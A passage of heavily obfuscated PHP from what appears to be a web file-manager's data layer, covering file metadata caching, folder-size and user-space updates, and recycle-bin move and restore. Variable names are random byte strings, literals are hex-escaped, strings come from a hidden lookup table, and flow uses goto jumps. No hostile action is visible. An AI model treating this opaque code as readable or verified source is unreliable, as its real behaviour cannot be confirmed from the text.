intval($“Œ®Ê…ü) . $õ»–„¯ê[481] . $¨ãéˆ­; $øª´ãæº = _get(self::$cachePathInfo, $ã€¨€åã); if ($øª´ãæº) { return $øª´ãæº; } $ ù÷¯½Ç = $this->sourceInfo($¨ãéˆ­); if (!$ ù÷¯½Ç) { return !1; } $ ù÷¯½Ç = $this->_listDataApplyItem($ ù÷¯½Ç, $“Œ®Ê…ü); self::$cachePathInfo[$ã€¨€åã] = $ ù÷¯½Ç; return $ ù÷¯½Ç; } public static $cachePathInfoMore = array(); public function pathInfoMore($¹×ùö’î) { $Ôâƒ÷š =& $_SERVER[‰‰Ş‚€]; $‰ûÎŸ÷® = _get(self::$cachePathInfoMore, $¹×ùö’î); if ($‰ûÎŸ÷®) { return $‰ûÎŸ÷®; } $Ìıí¶ï  = $this->pathInfo($¹×ùö’î); if (!$Ìıí¶ï ) { return !1; } if ($Ìıí¶ï [$Ôâƒ÷š[504]] == $Ôâƒ÷š[101]) { $Ìıí¶ï [$Ôâƒ÷š[92]] = $this->folderChildrenNumber($¹×ùö’î); } self::$cachePathInfoMore[$¹×ùö’î] = $Ìıí¶ï ; return $Ìıí¶ï ; } public function sourceInfo($£ÏÉÛØ­) { $˜ì Ñõ… =& $_SERVER[‰‰Ş‚€]; if (!$£ÏÉÛØ­) { return array(); } $£ÏÉÛØ­ = intval($£ÏÉÛØ­); $äæŠ§Àè = $˜ì Ñõ…[551] . $£ÏÉÛØ­; $‘Ö ôì® = _get(self::$cacheSourceInfo, $äæŠ§Àè); if ($‘Ö ôì®) { return $‘Ö ôì®; } $èËÚ²‰¹ = $this->where(array($˜ì Ñõ…[202] => $£ÏÉÛØ­))->find(); self::$cacheSourceInfo[$äæŠ§Àè] = $èËÚ²‰¹; return self::$cacheSourceInfo[$äæŠ§Àè]; } public function sourceCacheClear($ÌËş¥„Û = false) { self::cacheClear($ÌËş¥„Û); } public static function cacheClear($Ÿú´•œ’ = false) { $‚§èõ“­ =& $_SERVER[‰‰Ş‚€]; if ($Ÿú´•œ’ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$‚§èõ“­[551] . $Ÿú´•œ’]); unset(self::$cachePathInfoMore[$Ÿú´•œ’]); unset(self::$cachePathInfo[$‚§èõ“­[2348] . $Ÿú´•œ’]); unset(self::$cachePathInfo[$‚§èõ“­[2349] . $Ÿú´•œ’]); } public function metaSet($Ğ±úæîŞ, $Ó™æÀ¤˜ = null, $èëœúĞ† = null) { $ÉüóÕô = parent::metaSet($Ğ±úæîŞ, $Ó™æÀ¤˜, $èëœúĞ†); if ($ÉüóÕô) { $this->sourceCacheClear($Ğ±úæîŞ); } return $ÉüóÕô; } public function pathInfoByPath($ÂùĞß­Ä, $›œŠõú‹) { $”îÊş“ =& $_SERVER[‰‰Ş‚€]; $ë•Áò‡ = !$›œŠõú‹ ? array() : explode($”îÊş“[18], trim($›œŠõú‹, $”îÊş“[18])); $ˆ³¶œòó = intval($ÂùĞß­Ä); foreach ($ë•Áò‡ as $Á¯İµ¶) { $Û›İª·Ï = array($”îÊş“[201] => $ˆ³¶œòó, $”îÊş“[42] => $Á¯İµ¶); $óü‘±§Á = $this->field($”îÊş“[2350])->where($Û›İª·Ï)->select(); if (!$óü‘±§Á) { return !1; } $óü‘±§Á = array_sort_by($óü‘±§Á, $”îÊş“[524]); $ˆ³¶œòó = intval($óü‘±§Á[0][$”îÊş“[202]]); } $ú³ÔœÏô = $this->sourceInfo($ˆ³¶œòó); $this->pathInfoFilter($ú³ÔœÏô); return $ú³ÔœÏô; } protected function updateModifyTime($Ãäİˆóç) { $¥…º¨€Ä =& $_SERVER[‰‰Ş‚€]; $éœÍúö» = KodUser::id(); if (!$Ãäİˆóç) { return; } if (!is_array($Ãäİˆóç)) { $Ãäİˆóç = array($Ãäİˆóç); } foreach ($Ãäİˆóç as $©‹Üªƒ => $Ü‘Ò½›³) { $Ãäİˆóç[$©‹Üªƒ] = intval($Ü‘Ò½›³); $this->sourceCacheClear($Ü‘Ò½›³); } $ŞË¨û®ó = array($¥…º¨€Ä[202] => array($¥…º¨€Ä[17], $Ãäİˆóç)); $‰§üº† = array($¥…º¨€Ä[674] => $éœÍúö», $¥…º¨€Ä[517] => time()); $this->where($ŞË¨û®ó)->save($‰§üº†); } public function folderSizeReset($×ªˆîï›, $öµÙÉóƒ = false) { $¹Ç‘ñ¯ =& $_SERVER[‰‰Ş‚€]; if ($this->statusIgnoreResetSpace) { return; } if (!$×ªˆîï›) { return; } $ğÕãò“¨ = $this->sourceInfo($×ªˆîï›); $ˆ³ÙÅÈà = $¹Ç‘ñ¯[2351] . $×ªˆîï›; if (!$ğÕãò“¨ || !$ğÕãò“¨[$¹Ç‘ñ¯[202]]) { return; } CacheLock::lock($ˆ³ÙÅÈà, 20); if ($öµÙÉóƒ === !1) { $this->sourceCacheClear($×ªˆîï›); $ğÕãò“¨ = $this->sourceInfo($×ªˆîï›); $€¡„ÍÖñ = array($¹Ç‘ñ¯[496] => $×ªˆîï›, $¹Ç‘ñ¯[523] => 0); $ÔíÇÎÖ = $this->where($€¡„ÍÖñ)->sum($¹Ç‘ñ¯[89]); $öµÙÉóƒ = intval($ÔíÇÎÖ) - intval($ğÕãò“¨[$¹Ç‘ñ¯[89]]); } if ($öµÙÉóƒ == 0) { return CacheLock::unlock($ˆ³ÙÅÈà); } $ÇáüºÀ¹ = $this->parentLevelArray($ğÕãò“¨[$¹Ç‘ñ¯[604]]); if (!$ÇáüºÀ¹) { $ÇáüºÀ¹ = array(); } $ÇáüºÀ¹[] = $ğÕãò“¨[$¹Ç‘ñ¯[202]]; $€¡„ÍÖñ = array($¹Ç‘ñ¯[202] => array($¹Ç‘ñ¯[511], $ÇáüºÀ¹)); if ($öµÙÉóƒ < 0) { $€¡„ÍÖñ[$¹Ç‘ñ¯[89]] = array($¹Ç‘ñ¯[1125], abs($öµÙÉóƒ)); } $this->where($€¡„ÍÖñ)->setAdd($¹Ç‘ñ¯[89], $öµÙÉóƒ); CacheLock::unlock($ˆ³ÙÅÈà); if (!$ğÕãò“¨[$¹Ç‘ñ¯[589]] || $ğÕãò“¨[$¹Ç‘ñ¯[589]] == $¹Ç‘ñ¯[239]) { return; } $ä”¾ªŞ  = $¹Ç‘ñ¯[2352] . $ğÕãò“¨[$¹Ç‘ñ¯[199]] . $¹Ç‘ñ¯[14] . $ğÕãò“¨[$¹Ç‘ñ¯[589]]; $£Œı¦” = array($ğÕãò“¨[$¹Ç‘ñ¯[199]], $ğÕãò“¨[$¹Ç‘ñ¯[589]]); TaskRun::timeLimitCall($ä”¾ªŞ , $¹Ç‘ñ¯[2353], $£Œı¦”, 1.5); } public function folderSizeResetChildren($ÓÅÇ×œ‹) { $¶ş±‚¶ğ =& $_SERVER[‰‰Ş‚€]; $this->sourceCacheClear($ÓÅÇ×œ‹); $­¯ú‰ıÏ = $this->sourceInfo($ÓÅÇ×œ‹); if (!$­¯ú‰ıÏ) { return; } $Ûï¤“âÍ = array($¶ş±‚¶ğ[669] => 1, $¶ş±‚¶ğ[672] => $­¯ú‰ıÏ[$¶ş±‚¶ğ[589]], $¶ş±‚¶ğ[675] => array($¶ş±‚¶ğ[635], $­¯ú‰ıÏ[$¶ş±‚¶ğ[604]] . $ÓÅÇ×œ‹ . $¶ş±‚¶ğ[636])); $¤¿ÎÈ¶ = $¶ş±‚¶ğ[2354]; $ğì÷ÏÖ© = $this->field($¤¿ÎÈ¶)->where($Ûï¤“âÍ)->select(); $Ûï¤“âÍ[$¶ş±‚¶ğ[504]] = 0; $Æ©ç›Šª = $this->field($¤¿ÎÈ¶)->where($Ûï¤“âÍ)->select(); if (!$Æ©ç›Šª) { return; } $ğì÷ÏÖ©[] = $­¯ú‰ıÏ; $ğì÷ÏÖ© = array_to_keyvalue($ğì÷ÏÖ©, $¶ş±‚¶ğ[202]); foreach ($ğì÷ÏÖ© as $é½Ëçº½ => $Œ»›ôâ) { $ğì÷ÏÖ©[$é½Ëçº½][$¶ş±‚¶ğ[2355]] = $ğì÷ÏÖ©[$é½Ëçº½][$¶ş±‚¶ğ[89]]; $ğì÷ÏÖ©[$é½Ëçº½][$¶ş±‚¶ğ[89]] = 0; } foreach ($Æ©ç›Šª as $Œ»›ôâ) { $ÑçÅ¢ = $Œ»›ôâ[$¶ş±‚¶ğ[201]] . $¶ş±‚¶ğ[22]; if (!isset($ğì÷ÏÖ©[$ÑçÅ¢])) { continue; } if ($Œ»›ôâ[$¶ş±‚¶ğ[524]] == $ğì÷ÏÖ©[$ÑçÅ¢][$¶ş±‚¶ğ[524]]) { $ğì÷ÏÖ©[$ÑçÅ¢][$¶ş±‚¶ğ[89]] += $Œ»›ôâ[$¶ş±‚¶ğ[89]]; } } foreach ($ğì÷ÏÖ© as $Œ»›ôâ) { $ö¦Í¸ = $this->parentLevelArray($Œ»›ôâ[$¶ş±‚¶ğ[604]]); foreach ($ö¦Í¸ as $ÑçÅ¢) { $ÑçÅ¢ = $ÑçÅ¢ . $¶ş±‚¶ğ[22]; if (!isset($ğì÷ÏÖ©[$ÑçÅ¢])) { continue; } if ($Œ»›ôâ[$¶ş±‚¶ğ[524]] == $ğì÷ÏÖ©[$ÑçÅ¢][$¶ş±‚¶ğ[524]]) { $ğì÷ÏÖ©[$ÑçÅ¢][$¶ş±‚¶ğ[89]] += $Œ»›ôâ[$¶ş±‚¶ğ[89]]; } } } $é–ŒöşÀ = array(); foreach ($ğì÷ÏÖ© as $Œ»›ôâ) { if ($Œ»›ôâ[$¶ş±‚¶ğ[89]] == $Œ»›ôâ[$¶ş±‚¶ğ[2355]]) { continue; } $é–ŒöşÀ[] = array($¶ş±‚¶ğ[202], $Œ»›ôâ[$¶ş±‚¶ğ[202]], $¶ş±‚¶ğ[89], $Œ»›ôâ[$¶ş±‚¶ğ[89]]); } $this->saveAll($é–ŒöşÀ); } public function userSpaceReset($û¨Òâòå = false) { $Éé´¥‹» =& $_SERVER[‰‰Ş‚€]; $Ø×ëªÖõ = $this->where(array($Éé´¥‹»[199] => self::TYPE_USER, $Éé´¥‹»[589] => $û¨Òâòå, $Éé´¥‹»[504] => 0))->sum($Éé´¥‹»[89]); $Ø×ëªÖõ = !$Ø×ëªÖõ || $Ø×ëªÖõ <= 0 ? 0 : $Ø×ëªÖõ; Model($Éé´¥‹»[597])->userEdit($û¨Òâòå, array($Éé´¥‹»[2009] => $Ø×ëªÖõ)); } public function targetSpaceUpdate($÷¢À°İÜ, $Û‰¯×) { $í«†ç†‘ =& $_SERVER[‰‰Ş‚€]; if (!$Û‰¯×) { return; } if (!in_array($÷¢À°İÜ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $‘ÁÂ²ö¼ = $this->targetSpaceSize($÷¢À°İÜ, $Û‰¯×); if ($÷¢À°İÜ == self::TYPE_USER) { Model($í«†ç†‘[597])->userEdit($Û‰¯×, array($í«†ç†‘[2009] => $‘ÁÂ²ö¼)); } else { if ($÷¢À°İÜ == self::TYPE_GROUP) { Model($í«†ç†‘[605])->groupEdit($Û‰¯×, array($í«†ç†‘[2009] => $‘ÁÂ²ö¼)); } } } public function targetSpaceSize($¥¬…”“, $¹´ÏÉËã) { $ïÔå”² =& $_SERVER[‰‰Ş‚€]; $Í©¿åşË = 0; $Œß¿†«´ = $this->targetSourceRoot($¥¬…”“, $¹´ÏÉËã, !0); foreach ($Œß¿†«´ as $ïû»åÈ¹) { if (!$ïû»åÈ¹) { continue; } $Í©¿åşË += floatval($ïû»åÈ¹[$ïÔå”²[89]]); $ĞÑü¹— = array($ïÔå”²[675] => array($ïÔå”²[635], $ïÔå”²[613] . $ïû»åÈ¹[$ïÔå”²[202]] . $ïÔå”²[636])); $Ÿ¾‹à = Model($ïÔå”²[522])->field($ïÔå”²[510])->where($ĞÑü¹—)->select(); $Ÿ¾‹à = array_to_keyvalue($Ÿ¾‹à, $ïÔå”²[22], $ïÔå”²[202]); $Ÿ¾‹à = array_unique(array_filter($Ÿ¾‹à)); if ($Ÿ¾‹à) { $ĞÑü¹— = array($ïÔå”²[510] => array($ïÔå”²[511], $Ÿ¾‹à)); $Í©¿åşË += floatval($this->where($ĞÑü¹—)->sum($ïÔå”²[89])); } } $Í©¿åşË = !$Í©¿åşË || $Í©¿åşË <= 0 ? 0 : $Í©¿åşË; return $Í©¿åşË; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($«šŠ†Š¯) { return $this->fileTypeProfile($«šŠ†Š¯, SourceModel::TYPE_USER); } public function groupFileTypeProfile($’¸ñ‰Ü¨) { return $this->fileTypeProfile($’¸ñ‰Ü¨, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Øé˜õñ¡, $¿š“ù‡) { $ªé“ûâ =& $_SERVER[‰‰Ş‚€]; $‹îÊƒé‹ = $ªé“ûâ[2356] . $Øé˜õñ¡ . $ªé“ûâ[21] . $¿š“ù‡; $ÍÏÌÊºò = Cache::get($‹îÊƒé‹); if ($ÍÏÌÊºò) { return $ÍÏÌÊºò; } $²ˆ…†¤ = array($ªé“ûâ[669] => 0); if ($Øé˜õñ¡ != !1) { $²ˆ…†¤[$ªé“ûâ[589]] = $Øé˜õñ¡; $²ˆ…†¤[$ªé“ûâ[199]] = $¿š“ù‡; } $¹šÀäÅ = array(); $¹šÀäÅ[$ªé“ûâ[2357]] = array($ªé“ûâ[2358] => LNG($ªé“ûâ[2357]), $ªé“ûâ[2359] => $this->where($²ˆ…†¤)->count(), $ªé“ûâ[640] => $this->where($²ˆ…†¤)->sum($ªé“ûâ[89])); $ï¿á¤€ = KodIO::fileTypeList(); foreach ($ï¿á¤€ as $¿¬úèã => $¡şÉé) { $²ˆ…†¤[$ªé“ûâ[505]] = $this->fileTypeWhere($¿¬úèã); $¹šÀäÅ[$¿¬úèã] = array($ªé“ûâ[2358] => $¡şÉé[$ªé“ûâ[42]], $ªé“ûâ[2359] => $this->where($²ˆ…†¤)->count(), $ªé“ûâ[640] => $this->where($²ˆ…†¤)->sum($ªé“ûâ[89])); } Cache::set($‹îÊƒé‹, $¹šÀäÅ, 1200); return $¹šÀäÅ; } public function fileNameExist($šæÑ©®, $íˆ¨ïÅ¤) { $½¡¤å =& $_SERVER[‰‰Ş‚€]; $°¯„È³ö = $this->field($½¡¤å[2360])->where(array($½¡¤å[201] => $šæÑ©®, $½¡¤å[42] => $íˆ¨ïÅ¤, $½¡¤å[524] => 0))->find(); return is_array($°¯„È³ö) ? $°¯„È³ö[$½¡¤å[202]] : !1; } public function childList($èÓÏ›‡) { $Úæ¬¨õ =& $_SERVER[‰‰Ş‚€]; $˜‡¹†©Ü = $Úæ¬¨õ[2333] . $èÓÏ›‡; if (isset(self::$cacheChildList[$˜‡¹†©Ü])) { return self::$cacheChildList[$˜‡¹†©Ü]; } $é—ŸÔ÷İ = array($Úæ¬¨õ[201] => intval($èÓÏ›‡), $Úæ¬¨õ[524] => 0); $…ƒßÆ = $this->where($é—ŸÔ÷İ)->select(); $…ƒßÆ = $…ƒßÆ ? $…ƒßÆ : array(); self::$cacheChildList[$˜‡¹†©Ü] = $…ƒßÆ; foreach ($…ƒßÆ as $Ä”²»ë) { $˜‡¹†©Ü = $Úæ¬¨õ[551] . $Ä”²»ë[$Úæ¬¨õ[202]]; self::$cacheSourceInfo[$˜‡¹†©Ü] = $Ä”²»ë; } return $…ƒßÆ; } public function fileNameAuto($å®È¢äà, $ÑÖ´„éÀ, $Û¡Á©ë™ = REPEAT_RENAME, $¡øÉáá‰ = false) { $£«ÅÎ‚‚ =& $_SERVER[‰‰Ş‚€]; $¶Œä»‡Ï = get_path_ext($ÑÖ´„éÀ); $–Õßã˜ = $¶Œä»‡Ï ? get_path_ext_name($ÑÖ´„éÀ) . $£«ÅÎ‚‚[2361] . $¶Œä»‡Ï : $ÑÖ´„éÀ . $£«ÅÎ‚‚[479]; $Ãµ–ß¼í = array($£«ÅÎ‚‚[201] => $å®È¢äà, $£«ÅÎ‚‚[524] => 0, $£«ÅÎ‚‚[42] => array($£«ÅÎ‚‚[478], $–Õßã˜)); $ôŞ¹¿·ó = $this->field($£«ÅÎ‚‚[42])->where($Ãµ–ß¼í)->select(); $Ä°‘˜Ñí = array_to_keyvalue($ôŞ¹¿·ó, $£«ÅÎ‚‚[22], $£«ÅÎ‚‚[42]); return $this->fileNameAutoGet($Ä°‘˜Ñí, $ÑÖ´„éÀ, $Û¡Á©ë™, $¡øÉáá‰); } public function fileNameAutoGet($Ûæ™ùÉÔ, $¬Ô”¥×˜, $óÅÕşö‘, $‡Ø° ”ú) { $‰ãÌù‡ç =& $_SERVER[‰‰Ş‚€]; if ($óÅÕşö‘ == REPEAT_REPLACE || !$Ûæ™ùÉÔ || !in_array_not_case($¬Ô”¥×˜, $Ûæ™ùÉÔ) || $‡Ø° ”ú && $óÅÕşö‘ != REPEAT_RENAME_FOLDER) { return $¬Ô”¥×˜; } if ($óÅÕşö‘ == REPEAT_SKIP) { return !1; } $Ğà›úà = $‰ãÌù‡ç[20] . get_path_ext($¬Ô”¥×˜); $Ğà›úà = $Ğà›úà == $‰ãÌù‡ç[20] || $‡Ø° ”ú ? $‰ãÌù‡ç[22] : $Ğà›úà; for ($Øë“¶ä¬ = 1; $Øë“¶ä¬ <= count($Ûæ™ùÉÔ) + 1; $Øë“¶ä¬++) { $¡Š™ßÇÆ = substr($¬Ô”¥×˜, 0, strlen($¬Ô”¥×˜) - strlen($Ğà›úà)); $é¸çíïŞ = $¡Š™ßÇÆ . "\x28{$Øë“¶ä¬}\51{$Ğà›úà}"; if (!in_array_not_case($é¸çíïŞ, $Ûæ™ùÉÔ)) { return $é¸çíïŞ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\x72\x63\145\x5f\162\145\x63\x79\143\x6c\x65"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\124\x69\x6d\145", "\164\151\155\x65", "\151\156\x73\145\162\164", "\x66\x75\x6e\x63\164\151\x6f\156")); public function listData($âÉ¥“Ğû = false) { $²•¢Î¦™ =& $_SERVER[‰‰Ş‚€]; $âÉ¥“Ğû = $âÉ¥“Ğû ? $âÉ¥“Ğû : USER_ID; $æ…‘ö‹¨ = $this->where(array($²•¢Î¦™[1811] => $âÉ¥“Ğû))->select(); return array_to_keyvalue($æ…‘ö‹¨, $²•¢Î¦™[22], $²•¢Î¦™[202]); } public function moveToRecycle($Ûğ“àØ²) { $Àğ®‹Ñ =& $_SERVER[‰‰Ş‚€]; $ÕèÆó•­ = Model($Àğ®‹Ñ[1467]); $˜şàóÌ = $ÕèÆó•­->sourceInfo($Ûğ“àØ²); if (!$˜şàóÌ || $˜şàóÌ[$Àğ®‹Ñ[524]] == $Àğ®‹Ñ[101]) { return; } $ß´ğÀä½ = array($Àğ®‹Ñ[510] => $Ûğ“àØ², $Àğ®‹Ñ[1811] => USER_ID, $Àğ®‹Ñ[671] => $˜şàóÌ[$Àğ®‹Ñ[199]], $Àğ®‹Ñ[672] => $˜şàóÌ[$Àğ®‹Ñ[589]], $Àğ®‹Ñ[675] => $˜şàóÌ[$Àğ®‹Ñ[604]]); $this->add($ß´ğÀä½); $this->recycleMove($Ûğ“àØ², 1); if ($˜şàóÌ[$Àğ®‹Ñ[504]] == $Àğ®‹Ñ[101]) { $ÃáÒ«­÷ = array($Àğ®‹Ñ[675] => array($Àğ®‹Ñ[635], $˜şàóÌ[$Àğ®‹Ñ[604]] . $Ûğ“àØ² . $Àğ®‹Ñ[636])); $ÕèÆó•­->where($ÃáÒ«­÷)->setField($Àğ®‹Ñ[524], 1); } } public function clear() { $this->remove(!1); } public function remove($ÃüÍÉò = false, $‹³¶¿ûç = false) { $Û°ú°³Û =& $_SERVER[‰‰Ş‚€]; $‹³¶¿ûç = $‹³¶¿ûç ? $‹³¶¿ûç : USER_ID; $ŸÓğ‘¦Ù = Model($Û°ú°³Û[1467]); $·ŒïÛ½ü = $this->listData($‹³¶¿ûç); $ÃüÍÉò = $ÃüÍÉò === !1 ? !1 : $ÃüÍÉò; $”¸ù‡¹„ = array(); foreach ($·ŒïÛ½ü as $ÙÙÀ¨€) { if ($ÃüÍÉò != !1 && !in_array($ÙÙÀ¨€, $ÃüÍÉò)) { continue; } $ë¹”åÎ° = $ŸÓğ‘¦Ù->sourceInfo($ÙÙÀ¨€); $ŸÓğ‘¦Ù->remove($ÙÙÀ¨€, !1); $µ¨¹ªÂš = $ë¹”åÎ°[$Û°ú°³Û[199]] . $Û°ú°³Û[21] . $ë¹”åÎ°[$Û°ú°³Û[589]]; $”¸ù‡¹„[$µ¨¹ªÂš] = array($Û°ú°³Û[671] => $ë¹”åÎ°[$Û°ú°³Û[199]], $Û°ú°³Û[589] => $ë¹”åÎ°[$Û°ú°³Û[589]]); $this->where(array($Û°ú°³Û[202] => $ÙÙÀ¨€))->delete(); } foreach ($”¸ù‡¹„ as $ˆ›™àş) { $ŸÓğ‘¦Ù->targetSpaceUpdate($ˆ›™àş[$Û°ú°³Û[199]], $ˆ›™àş[$Û°ú°³Û[589]]); } } public function restore($Ñ½‡ÖÓ³ = false) { $“˜ˆÉÏ = $this->listData(); $this->_restoreSource($“˜ˆÉÏ, $Ñ½‡ÖÓ³); } public function removeUserAll($á±ìÌ“·) { $this->remove(!1, $á±ìÌ“·); } public function restoreItem($Æ³òÑÈ) { $this->_restoreSource(array($Æ³òÑÈ), array($Æ³òÑÈ)); } private function _restoreSource($ÙÚá×ËÇ, $Ø†òıÈ‡) { $€¤„Ï =& $_SERVER[‰‰Ş‚€]; $ÜúäÎ£œ = Model($€¤„Ï[1467]); $Ø†òıÈ‡ = $Ø†òıÈ‡ == !1 ? !1 : $Ø†òıÈ‡; if (!$ÙÚá×ËÇ) { return !0; } $‚ığ×É† = array(); foreach ($ÙÚá×ËÇ as $ªé„úâ•) { if ($Ø†òıÈ‡ != !1 && !in_array($ªé„úâ•, $Ø†òıÈ‡)) { continue; } $ñŠª†º÷ = $ÜúäÎ£œ->sourceInfo($ªé„úâ•); $›‡’Ï = $ÜúäÎ£œ->sourceInfo($ñŠª†º÷[$€¤„Ï[201]]); if ($›‡’Ï[$€¤„Ï[524]] == $€¤„Ï[101]) { continue; } $ÜúäÎ£œ->lockMoveStart($ªé„úâ•); $this->recycleMove($ªé„úâ•, 0); if ($ñŠª†º÷[$€¤„Ï[504]] == $€¤„Ï[101]) { $úŞªôÅŞ = array($€¤„Ï[675] => array($€¤„Ï[635], $ñŠª†º÷[$€¤„Ï[604]] . $ªé„úâ• . $€¤„Ï[636])); $ÜúäÎ£œ->where($úŞªôÅŞ)->setField($€¤„Ï[524], 0); $this->restoreFolderChildren($ªé„úâ•, $ÙÚá×ËÇ); } $this->where(array($€¤„Ï[202] => $ªé„úâ•))->delete(); $ÜúäÎ£œ->folderSizeReset($ñŠª†º÷[$€¤„Ï[201]]); $‚ığ×É†[] = $ñŠª†º÷[$€¤„Ï[201]]; if ($ñŠª†º÷[$€¤„Ï[504]] == $€¤„Ï[101]) { $‚ığ×É†[] = $ªé„úâ•; } $ÜúäÎ£œ->lockMoveEnd($ªé„úâ•); } $ÜúäÎ£œ->updateModifyTime($‚ığ×É†); } private function restoreFolderChildren($«Á‚‡Ê, $°Ü×Ñ·Å) { $ü´Ï¤— =& $_SERVER[‰‰Ş‚€]; $„–ç–•ß = Model($ü´Ï¤—[1467]); $½ÒúùËÊ = array($ü´Ï¤—[202] => array($ü´Ï¤—[17], array())); foreach ($°Ü×Ñ·Å as $í¨ü¯šÙ) { if ($í¨ü¯šÙ == $«Á‚‡Ê) { continue; } if (!$„–ç–•ß->isParentOf($«Á‚‡Ê, $í¨ü¯šÙ)) { continue; } $ó¦µ‡» = $„–ç–•ß->sourceInfo($í¨ü¯šÙ); if ($ó¦µ‡»[$ü´Ï¤—[504]] == $ü´Ï¤—[101]) { $½ÒúùËÊ[] = array($ü´Ï¤—[675] => array($ü´Ï¤—[635], $ó¦µ‡»[$ü´Ï¤—[604]] . $í¨ü¯šÙ . $ü´Ï¤—[636])); } else { $½ÒúùËÊ[$ü´Ï¤—[202]][1][] = $í¨ü¯šÙ; } } if (!$½ÒúùËÊ[$ü´Ï¤—[202]][1]) { unset($½ÒúùËÊ[$ü´Ï¤—[202]]); } if (!$½ÒúùËÊ) { return; } if (is_array($½ÒúùËÊ[$ü´Ï¤—[202]]) && is_array($½ÒúùËÊ[$ü´Ï¤—[202]][1])) { $½ÒúùËÊ[$ü´Ï¤—[202]][1] = array_unique($½ÒúùËÊ[$ü´Ï¤—[202]][1]); } $½ÒúùËÊ[$ü´Ï¤—[1110]] = $ü´Ï¤—[2123]; $„–ç–•ß->where($½ÒúùËÊ)->setField($ü´Ï¤—[524], 1); } private function recycleMove($ØŠ¼ã›”, $‘†õãù² = 1) { $ÙÖ…æÃü =& $_SERVER[‰‰Ş‚€]; $Ï»‹ë = Model($ÙÖ…æÃü[1467]); $Ë×Ş» = Model($ÙÖ…æÃü[2362]); $È„®·ÑÇ = array($ÙÖ…æÃü[202] => $ØŠ¼ã›”); if ($‘†õãù²) { $Ï»‹ë->where($È„®·ÑÇ)->setField($ÙÖ…æÃü[524], 1); $Ë×Ş»->eventRecycle($ØŠ¼ã›”, $ÙÖ…æÃü[2363]); } else { $Úá€›Òã = $Ï»‹ë->where($È„®·ÑÇ)->find(); $¢¶«…œŞ = $Úá€›Òã[$ÙÖ…æÃü[504]] == $ÙÖ…æÃü[101]; $Šâ™èàµ = $Ï»‹ë->fileNameAuto($Úá€›Òã[$ÙÖ…æÃü[201]], $Úá€›Òã[$ÙÖ…æÃü[42]], REPEAT_RENAME_FOLDER, $¢¶«…œŞ); if ($Šâ™èàµ != $Úá€›Òã[$ÙÖ…æÃü[42]]) { $Ï»‹ë->rename($ØŠ¼ã›”, $Šâ™èàµ); } $Ï»‹ë->where($È„®·ÑÇ)->setField($ÙÖ…æÃü[524], 0); $Ë×Ş»->eventRecycle($ØŠ¼ã›”, $ÙÖ…æÃü[2364]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\x73\157\x75\x72\x63\145\123\x65\143\162\x65\x74\x4c\x69\163\x74"; public $field = array("\163\x6f\165\162\x63\x65\111\x44", "\x74\x79\160\x65\111\104", "\x63\162\x65\x61\164\x65\x55\163\x65\x72"); } goto Díõë“•İ; E—©¤©Š÷: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $é©é§óé =& $_SERVER[‰‰Ş‚€]; $this->objectDriver = array($é©é§óé[70], $é©é§óé[71], $é©é§óé[72], $é©é§óé[73], $é©é§óé[74], $é©é§óé[75], $é©é§óé[76], $é©é§óé[77], $é©é§óé[78], $é©é§óé[79], $é©é§óé[80], $é©é§óé[81]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ŠĞ¶íıü) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ŠĞ¶íıü, $_SERVER[‰‰Ş‚€][18]); } return $ŠĞ¶íıü; } public function iconvApp($¶²÷ÎÛ) { return $¶²÷ÎÛ; } public function iconvSystem($í°Éê»˜) { return $í°Éê»˜; } public function iconvTo($ƒô„¹óë, $¤´¼ø¤’, $º÷¢–Íš) { $ÛäÈŒò =& $_SERVER[‰‰Ş‚€]; if (!$ƒô„¹óë || !function_exists($ÛäÈŒò[82])) { return $ƒô„¹óë; } static $¾ïï«·” = array(); $¯ó‚©ú = $¤´¼ø¤’ . $ÛäÈŒò[83] . $º÷¢–Íš . $ÛäÈŒò[84] . $ƒô„¹óë; if (isset($¾ïï«·”[$¯ó‚©ú])) { return $¾ïï«·”[$¯ó‚©ú]; } if (function_exists($ÛäÈŒò[85])) { $áƒşá× = @mb_convert_encoding($ƒô„¹óë, $º÷¢–Íš, $¤´¼ø¤’); } else { $áƒşá× = @iconv($¤´¼ø¤’, $º÷¢–Íš, $ƒô„¹óë); } $áƒşá× = $áƒşá× ? $áƒşá× : $ƒô„¹óë; if (strstr($áƒşá×, $ÛäÈŒò[86])) { $áƒşá× = str_replace($ÛäÈŒò[86], $ÛäÈŒò[21], $áƒşá×); } $¾ïï«·”[$¤´¼ø¤’ . $ÛäÈŒò[83] . $º÷¢–Íš . $ÛäÈŒò[84] . $ƒô„¹óë] = $áƒşá×; $¾ïï«·”[$º÷¢–Íš . $ÛäÈŒò[83] . $¤´¼ø¤’ . $ÛäÈŒò[84] . $ƒô„¹óë] = $ƒô„¹óë; $¾ïï«·”[$º÷¢–Íš . $ÛäÈŒò[83] . $¤´¼ø¤’ . $ÛäÈŒò[84] . $áƒşá×] = $ƒô„¹óë; $¾ïï«·”[$¤´¼ø¤’ . $ÛäÈŒò[83] . $º÷¢–Íš . $ÛäÈŒò[84] . $áƒşá×] = $áƒşá×; return $áƒşá×; } public function getPathInner($£“ÀŠˆó) { $÷ïáõç = IO::init($£“ÀŠˆó); return $÷ïáõç->path; } public function getPathOuter($½ÙĞé­£) { $ëÎ§”„ =& $_SERVER[‰‰Ş‚€]; $ÃÛ’Ø“ = strlen(trim($this->pathBase, $ëÎ§”„[18])); $½ÙĞé­£ = substr(trim($½ÙĞé­£, $ëÎ§”„[18]), $ÃÛ’Ø“); return $this->pathDriver . $ëÎ§”„[18] . ltrim($½ÙĞé­£, $ëÎ§”„[18]); } public function isParentOf($Æºôüì, $ñĞ¤Õƒú) { $å„Ä»ØÂ =& $_SERVER[‰‰Ş‚€]; $Æºôüì = rtrim(strtolower($Æºôüì), $å„Ä»ØÂ[18]) . $å„Ä»ØÂ[18]; 